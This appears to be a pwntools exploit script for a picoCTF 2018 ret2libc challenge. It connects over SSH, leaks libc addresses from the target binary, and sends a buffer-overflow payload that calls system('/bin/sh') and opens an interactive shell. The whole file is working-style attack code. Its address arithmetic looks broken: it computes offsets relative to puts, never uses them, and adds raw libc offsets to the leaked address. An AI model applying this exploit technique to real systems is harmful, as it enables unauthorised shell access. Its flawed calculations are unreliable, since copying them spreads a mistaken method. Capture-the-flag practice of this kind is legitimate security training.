from pwn import *

returnAddressOffset = 160

pswd = open('/home/osboxes/pass', 'r').read()

shell = ssh(host='2018shell1.picoctf.com', user='sploitem', password=pswd, ssh_agent=True)
shell.set_working_directory('/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f')

# get remote libc
shell.download_file('/lib32/libc.so.6', './libc.so.6')

# get functions offsets in libc
libc = ELF('./libc.so.6')
systemOffset = libc.symbols['system']
exitOffset = libc.symbols['exit']
putsOffset = libc.symbols['puts']

# get info leaks from program
p = shell.process('./vuln')
lines = p.recvuntil(' a string:').split('\n')

putsAddress = lines[2].split(': ')[1]
putsAddress = int(putsAddress, 16)

binShAddress = lines[6].split(': ')[1]
binShAddress = int(binShAddress, 16)

# calculate system offset from puts
systemPutsOffset = systemOffset - putsOffset

# calculate system address in libc
systemAddress = putsAddress + systemOffset
print 'system: ' + hex(systemAddress)

#calculate exit offset from puts
exitPutsOffset = exitOffset - putsOffset

# exit address in libc
exitAddress = putsAddress + exitOffset
print 'exit: ' + hex(exitAddress)

# craft a payload
nops = '\x90' * returnAddressOffset
payload = nops + p32(systemAddress) + p32(exitAddress) + p32(binShAddress)

p.sendline(payload)
p.interactive()

p.close()
shell.close()